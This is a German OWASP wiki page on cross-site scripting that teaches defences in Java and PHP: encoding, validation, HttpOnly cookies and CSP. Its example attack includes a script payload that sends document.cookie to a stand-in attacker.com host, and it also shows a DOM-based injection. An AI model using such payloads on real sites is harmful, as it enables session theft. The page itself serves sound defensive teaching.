` `

`    <td ``>Jeder, der nicht ausreichend geprüfte Daten an das System übermitteln kann: externe und interne Nutzer, sowie Administratoren.`

</td>

`    <td ``>Der Angreifer sendet textbasierte Angriffsskripte, die Eigenschaften des Browsers ausnutzen. Fast jede Datenquelle kann einen Angriffsvektor beinhalten, auch interne Quellen wie Datenbanken.`

</td>

`    <td colspan=2  ``>`

XSS ist die am weitesten verbreitete Schwachstelle in Webanwendungen.
XSS-Schwachstellen treten dann auf, wenn die Anwendung vom Benutzer
eingegebene Daten übernimmt, ohne sie hinreichend zu validieren und
Metazeichen als Text zu kodieren. Es gibt drei Typen von
XSS-Schwachstellen: 1) Persistent, 2) nicht-persistent/reflektiert, und
3) DOM-basiert (lokal). Die meisten XSS-Schwachstellen sind
verhältnismäßig einfach mit Hilfe von Tests oder Code-Analyse zu
erkennen.

</td>

`    <td ``>Angreifer können Skripte im Browser des Opfers ausführen und die Session übernehmen, Webseiten entstellen, falsche Inhalte einfügen, Benutzer umleiten, den Browser des Benutzers durch Malware übernehmen.`

</td>

`    <td ``>`

Berücksichtigen Sie den geschäftlichen Nutzen des betroffenen Systems
und der verarbeiteten Daten. Bedenken Sie ebenfalls die Auswirkung auf
das Unternehmen bei Bekanntwerden der Schwachstelle.

</td>

Die Anwendung übernimmt nicht vertrauenswürdige Daten, die nicht auf
Gültigkeit geprüft oder escaped werden, um folgenden HTML-Code zu
generieren: <span style="color:red;">(String) page += "\<input
name='creditcard' type='TEXT' value='" **+ request.getParameter("CC")**
+ "'\>";</span> Der Angreifer ändert den Parameter
<span style="color:red;">**‘CC’**</span> in seinem Browser auf:
<span style="color:red;">**'\>\<script\>document.location=
'http://www.attacker.com/cgi-bin/cookie.cgi?
foo='+document.cookie\</script\>'**</span>. Dadurch wird die Session-ID
des Benutzers an die Seite des Angreifers gesendet, so dass der
Angreifer die aktuelle Benutzersession übernehmen kann. Beachten Sie
bitte, dass Angreifer XSS auch nutzen können, um jegliche CSRF-Abwehr
der Anwendung zu umgehen. A8 enthält weitere
[text=documentRootTop10DeveloperEdition]({{Top_10:LanguageFile "wikilink").

Es wird zwischen 3 Varianten für XSS unterschieden:

1.  **Reflektiert bzw. nicht persistent:** Die Benutzereingabe wird
    direkt von der Webanwendung zum Benutzer zurück gesendet. Enthält
    die Eingabe schädlichen Skriptcode, wird dieser im Browser des
    Benutzers ausgeführt. Bsp.: Benutzerforen, Gästebuch,...
2.  **beständig bzw. persistent**: schädlicher Skriptcode wird zunächst
    in der Webanwendung gespeichert und erst später bei Anfragen
    ausgeliefert. Bsp.: Suchergebnisse, Fehlermeldungen oder andere
    Antworten des Webservers, die Teile der Eingabe enthalten.
3.  **DOM-basiert oder lokal**: Schadcode wird direkt an ein
    client-seitiges Skript übergeben. Die Webanwendung ist überhaupt
    nicht beteiligt. Bsp: /\* Falls die Webseite
    'http://www.example.com/test.html' folgenden Source-Code enthält
    \*/
    <span style="color:red;">\<script\>
      document.write("Current URL : " + document.baseURI);
    \</script\></span>
    /\* kann der XSS-Angriff via lokaler DOM über folgenden 'Link'
    erfolgen: \*/
    <span style="color:red;">http://www.example.com/test.html**\#\<script\>alert(1)\</script\>**</span>

**Um XSS zu verhindern, müssen nicht vertrauenswürdige Daten von aktiven
Browserinhalten getrennt werden.**

1.  Vorzugsweise sollten nicht vertrauenswürdige Metazeichen dem
    Kontext, in dem sie ausgegeben werden (HTML, JavaScript, CSS, URL
    usw.), entsprechend escaped werden. Das <u>[OWASP XSS Prevention
    Cheat
    Sheet](XSS_\(Cross_Site_Scripting\)_Prevention_Cheat_Sheet "wikilink")</u>
    enthält weitere Informationen zu Escaping-Techniken.
2.  Eine Eingabeüberprüfung durch Positivlisten (“White-listing") wird
    empfohlen. Dieses Vorgehen bietet jedoch **<u>keinen umfassenden
    Schutz</u>**, da viele Anwendungen Metazeichen als
    Eingabemöglichkeit erfordern. Eine Gültigkeitsprüfung sollte
    kodierte Eingaben normalisieren und auf Länge, Zeichen und Format
    prüfen, bevor die Eingabe akzeptiert wird.
3.  Für komplexe Inhalte sollten Hilfsbibliotheken wie OWASP’s
    <u>[AntiSamy](AntiSamy "wikilink")</u> oder das <u>[Java HTML
    Sanitizer Project](OWASP_Java_HTML_Sanitizer_Project "wikilink")</u>
    in Betracht gezogen werden.
4.  Content Security Policies (CSP) können als globaler Schutz Ihrer
    gesamten Anwendung gegenüber XSS eingesetzt werden. (vgl.
    <u>[Mozilla: Content Security
    Policy](https://developer.mozilla.org/en/Introducing_Content_Security_Policy))</u>

<b>Anmerkung:</b> Die beschriebenen Maßnahmen sind auf dem
(Anwendungs-)Server umzusetzen bzw. durchzusetzen, optional können sie
teilweise <u>zusätzlich</u> auf dem Client (z.B. Eingabeprüfung per Java
Skript) realisiert werden, um den Benutzer frühzeitig über
Falscheingaben zu informieren.

# **JAVA**

#### Schutz gegen Diebstahl der Session durch XSS

Ein sehr einfach zu realisierender Schutz der eigentlichen Session-ID
besteht darin für ein Session-Cookie grundsätzlich das Flag "httponly"
zu setzen. Dieses Flag teilt dem Browser mit, dass ein Zugriff eines
Client-Scripts (egal woher es kommt) auf das Session-Cookie nicht
erlaubt ist. Normalerweise gibt es auch keinen Grund warum dies nötig
sein sollte.

Es gibt verschiedene Möglichekeiten dieses Flag zu setzen:
//Programmatisch
Cookie cookie = getMyCookie("myCookieName");
cookie.setHttpOnly(true);

//konfigurativ (Bsp. Deployment Descriptor WEB-INF/web.xml ab JEE6)
<session-config>
:<cookie-config>
::<http-only>true</http-only>
:</cookie-config>
</session-config>
Weitere Details dazu finden sich unter [OWASP
HttpOnly](https://www.owasp.org/index.php/HttpOnly)

  - ACHTUNG\!\!\!

Durch diese Maßnahme wird das Thema XSS nur zu einem Teil addressiert,
nur der Diebstahl von Cookies wird verhindert. Tatsächlich werden
Cookies nicht unbedingt für einen erfolgreichen Angriff benötigt, man
kann auch die Anwendungslogik auch ohne Cookies angreifen wenn
übergebene Daten nicht ausreichend geprüft werden. Näheres findet zu
diesem Aspekt man bei [Why HttpOnly won’t protect
you](http://www.gnucitizen.org/blog/why-httponly-wont-protect-you/). Je
nach Schutzbedarf der Anwendung sollten deshalb auch die weiteren
Verteidungsoptionen gegen XSS geprüft werden.

Diese Maßnahme ist jedoch sehr einfach umzusetzen und und gehört aus
diesem Grund grundsätzlich in jede Anwendung. Sie verringert die
Angreifbarkeit der Anwendung in einem signifikantem Umfang, da
weiterführende Angriffe erst einmal einen wesentlich größeren Aufwand
für den Angreifer bedeuten.

#### Reflektiertes und Persistentes XSS

<b>Canonicalize Input</b> Setze Zeichenkodierung und Sprache auf die
einfachste Form, z.B. im Header der ausgelieferten Seiten:
<b>Content-Type: text/html; charset=utf-8, Accept-Language: da,
en-gb;q=0.8, en;q=0.7</b>. Damit reduzieren sich die Möglichkeiten
nachfolgende Validierungsroutinen zu umgehen.

<b>Validate Input Using a Whitelist</b> Whitelist validation (accept
only known good data) is a key tenet of good security. Check the content
of the data, the length, data type, etc.

  - Validierung gegen Positiv-Listen z.B.
    <b>\[^\[a-zA-Z0-9+&\*-\]+(?:\\.\[a-zA-Z0-9_+&\*-\]+)\*@(?:\[a-zA-Z0-9-\]+\\.)+\[a-zA-Z\]{2,7}$\]\]</b>
    für das Format der Email-Adresse. Weitere Beispiele befinden sich im
    [OWASP Validation Regex
    Repository](OWASP_Validation_Regex_Repository "wikilink").

<b>Contextual Output Encoding/Escaping:</b> Output Escaping is the last
step, and must be done for the appropriate context. You must understand
where you’re sticking data, and how that location is interpreted from
the browser’s view. This can be a sticky issue, so this one gets a bit
problematic.

  - Ist nicht ausreichend, falls Metazeichen (im wesentlichen
    %&/()=?{\[\]}\\+\*\~\<\>

|,;.:-^' usw.) verarbeitet werden müssen. In diesem Fall sind solche
Metazeichen nach Möglichkeit geeignet zu kodieren (insbes. & zu \&amp,
\< zu \&lt, \> zu \&gt, " zu \&quot, ' zu &\#x27 und / zu &\#x2F). Die
Verwendung von Frameworks wie ESAPI erlaubt eine vollständigere Lösung
des Problems:

  - <u>[ESAPI Encoder
    API](http://owasp-esapi-java.googlecode.com/svn/trunk_doc/latest/org/owasp/esapi/Encoder.html)</u>

String safeEncodedOutput =
:::ESAPI.encoder().encodeForHTML(request.getParameter( "input" ));
;<u>[OWASP Java Encoder
Project](OWASP_Java_Encoder_Project "wikilink")</u>
'Encode.forHtml(...)' bzw. 'Encode.forJavaScript(...)' wären aus
Sicherheitssicht ebenfalls möglich, sie sind jedoch nicht so performant
(da sie mehr Zeichen, als notwendig umcodieren würden).
String safeEncodedOutput =
:::Encode.forHtmlContent(request.getParameter( "input" ));
;Beispiele für JSP
<input type="text" name="data" value="<%= Encode.forHtmlAttribute (dataValue) %>"
/\>

\<script type="text/javascript”\>
var msg= "\<%=Encode.forJavaScriptBlock (message) %\>”; alert(msg);

</script>


**Quellen:**
[Use_the_Java_Encoder_Project](OWASP_Java_Encoder_Project#Use_the_Java_Encoder_Project "wikilink"),
[Approaching Secure
Code](http://secappdev.org/handouts/2013/Jim%20Manico/secure%20coding.pdf)

<b>Anmerkung:</b> Die beschriebenen Maßnahmen sind auf dem
(Anwendungs-)Server umzusetzen bzw. durchzusetzen, optional können sie
teilweise <u>zusätzlich</u> auf dem Client (z.B. Eingabeprüfung per Java
Skript) realisiert werden, um den Benutzer frühzeitig über
Falscheingaben zu informieren.

#### Content Security Policy (CSP)

CSP erzwingt eine stringente Trennung des Javascript-Codes vom Inhalt
und ermöglich damit ein strikte Kontrolle der Herkunft des Codes.

Um CSP zu aktivieren muss der Header X-Content-Security-Policy (für
Firefox und IE10; X-WebKit-CSP für Chrome und Safari) in der
http-Antwort gesetzt werden:

<span style="color:red;">response.setHeader(
"X-Content-Security-Policy", "'self'; img-src \*; object-src media1.com
media2.com; script-src scripts.example.com" ); </span>

<b>Sobald CSP-Header gesetzt werden gelten in einem kompatiblen Browser
folgende Einschränkungen:</b>

  - inline-Skripte werden nicht mehr ausgeführt (<spript>-Tag,
    javascript URIs, event handling Attribute), d.h. Javascript Code
    muss vollständig in externe .js-Dateien ausgelagern.
  - eval(), setTimeout(string), setIntervall(string) und new function
    wird geblockt, da diese Funktionen die Umwandlung von Inhalt in Code
    erlauben

Ältere Browser ignorieren den Header. Aus diesem Grund sollte man sich
zu diesem Zeitpunkt noch nicht ausschließlich auf CSP verlassen, sondern
es als eine flankierende Maßnahme ansehen. Weitere Informationen zu CSP
findet man
[wiki.mozilla.org](https://wiki.mozilla.org/Security/CSP/Deploying)

Auf Heise Security ist eine detaillierte Beschreibung zu CSP erschienen:
[Bodyguard für
Webseiten](http://www.heise.de/security/artikel/XSS-Bremse-Content-Security-Policy-1888522.html)

#### DOM-basiertes oder lokales XSS

Vergleiche Beispiele im '[DOM based XSS Prevention Cheat
Sheet](DOM_based_XSS_Prevention_Cheat_Sheet "wikilink")'

  - [OWASP XSS Prevention Cheat
    Sheet](XSS_\(Cross_Site_Scripting\)_Prevention_Cheat_Sheet "wikilink")
  - [OWASP DOM based XSS Prevention Cheat
    Sheet](DOM_based_XSS_Prevention_Cheat_Sheet "wikilink")
  - [OWASP Proactive Controls:](OWASP_Proactive_Controls "wikilink")
    Kapitel über ['Encode
    Data'](OWASP_Proactive_Controls#3:_Encode_Data "wikilink") und
    ['Validate all
    Inputs'](OWASP_Proactive_Controls#4:_Validate_All_Inputs "wikilink")
  - [OWASP Cross-Site Scripting
    Article](Cross-site_Scripting_\(XSS\) "wikilink")
  - [Approaching Secure
    Code](http://secappdev.org/handouts/2013/Jim%20Manico/secure%20coding.pdf)
  - [ESAPI Encoder
    API](http://owasp-esapi-java.googlecode.com/svn/trunk_doc/latest/org/owasp/esapi/Encoder.html)
  - [OWASP Java Encoder Project](OWASP_Java_Encoder_Project "wikilink")
  - [ASVS: Output Encoding/Escaping Requirements
    (V6)](http://www.owasp.org/index.php/ASVS#tab=Downloads)
  - [ASVS: Input Validation Requirements
    (V5)](http://www.owasp.org/index.php/ASVS#tab=Downloads)
  - [Testing Guide: 1st 3 Chapters on Data Validation
    Testing](Testing_for_Data_Validation "wikilink")
  - [OWASP Code Review Guide: Chapter on XSS
    Review](Reviewing_Code_for_Cross-site_scripting "wikilink")
  - [Content Security Policy](Content_Security_Policy "wikilink")
  - [Überblick über Content Security Policy (CSP) - ein Verfahren zur
    Verhinderung von XSS-Angriffen (Lightning-Talk von Christine
    Koppelt)](Media:OWASP_MUC_csp_lightning-talk.pdf "wikilink")

<!-- end list -->

  - [CWE Entry 79 on Cross-Site
    Scripting](http://cwe.mitre.org/data/definitions/79.html)
  - [RSnake's XSS Attack Cheat Sheet](http://ha.ckers.org/xss.html)
  - [Firefox 4’s Anti-XSS Content Security Policy
    Mechanism](https://developer.mozilla.org/en/Introducing_Content_Security_Policy)
  - W3C-Spezifikation Content Security Policy
    [Version 1.0,](http://www.w3.org/TR/CSP/) [DRAFT
    für 1.1](http://www.w3.org/TR/CSP11/)

# **PHP**

tbd Text

#### Reflektiertes und Persistentes XSS

<b>Canonicalize Input</b> Setze Zeichenkodierung und Sprache auf die
einfachste Form, z.B. im Header der ausgelieferten Seiten:
<b>Content-Type: text/html; charset=utf-8, Accept-Language: da,
en-gb;q=0.8, en;q=0.7</b>. Damit reduzieren sich die Möglichkeiten
nachfolgende Validierungsroutinen zu umgehen.

<b>Validate Input Using a Whitelist</b> Whitelist validation (accept
only known good data) is a key tenet of good security. Check the content
of the data, the length, data type, etc.

  - Validierung gegen Positiv-Listen z.B.
    <b>\[^\[a-zA-Z0-9+&\*-\]+(?:\\.\[a-zA-Z0-9_+&\*-\]+)\*@(?:\[a-zA-Z0-9-\]+\\.)+\[a-zA-Z\]{2,7}$\]\]</b>
    für das Format der Email-Adresse. Weitere Beispiele befinden sich im
    [OWASP Validation Regex
    Repository](OWASP_Validation_Regex_Repository "wikilink").

<b>Contextual Output Encoding/Escaping:</b> Output Escaping is the last
step, and must be done for the appropriate context. You must understand
where you’re sticking data, and how that location is interpreted from
the browser’s view. This can be a sticky issue, so this one gets a bit
problematic.

  - Ist nicht ausreichend, falls Metazeichen (im wesentlichen
    %&/()=?{\[\]}\\+\*\~\<\>

|,;.:-^' usw.) verarbeitet werden müssen. In diesem Fall sind solche
Metazeichen nach Möglichkeit geeignet zu kodieren (insbes. & zu \&amp,
\< zu \&lt, \> zu \&gt, " zu \&quot, ' zu &\#x27 und / zu &\#x2F).

/\* encoding for html \*/

echo htmlentities($input, ENT_QUOTE | ENT_SUBSTITUTE, 'UTF-8');

Um JSON in HTML-Attributen sicher auszugeben ist json_encode alleine
nicht ausreichend.  /\* encoding for json \*/

echo htmlentities(json_encode($input), ENT_QUOTE | ENT_SUBSTITUTE,
'UTF-8');

<b>Anmerkung:</b> Die beschriebenen Maßnahmen sind auf dem
(Anwendungs-)Server umzusetzen bzw. durchzusetzen, optional können sie
teilweise <u>zusätzlich</u> auf dem Client (z.B. Eingabeprüfung per Java
Skript) realisiert werden, um den Benutzer frühzeitig über
Falscheingaben zu informieren.

#### Content Security Policy (CSP)

CSP erzwingt eine stringente Trennung des Javascript-Codes vom Inhalt
und ermöglich damit ein strikte Kontrolle der Herkunft des Codes.

Um CSP zu aktivieren muss der Header X-Content-Security-Policy (für
Firefox und IE10; X-WebKit-CSP für Chrome und Safari) in der
http-Antwort gesetzt werden:

<span style="color:red;">header( "X-Content-Security-Policy", "'self';
img-src \*; object-src media1.com media2.com; script-src
scripts.example.com" ); </span>

<b>Sobald CSP-Header gesetzt werden gelten in einem kompatiblen Browser
folgende Einschränkungen:</b>

  - inline-Skripte werden nicht mehr ausgeführt (
    <script>
    \-Tag, javascript URIs, event handling Attribute), d.h. Javascript
    Code muss vollständig in externe .js-Dateien ausgelagern.
  - eval(), setTimeout(string), setIntervall(string) und new function
    wird geblockt, da diese Funktionen die Umwandlung von Inhalt in Code
    erlauben

Ältere Browser ignorieren den Header. Aus diesem Grund sollte man sich
zu diesem Zeitpunkt noch nicht ausschließlich auf CSP verlassen, sondern
es als eine flankierende Maßnahme ansehen. Weitere Informationen findet
man [hier](https://wiki.mozilla.org/Security/CSP/Deploying)

\-- weitere Programmiersprachen oder evtl Anti-Beispiele --- \>

# **Test**

tbd Text

tbd Text

tbd Text

(ganze Breite) Text

\-----------------------------------------------------\> <headertabs />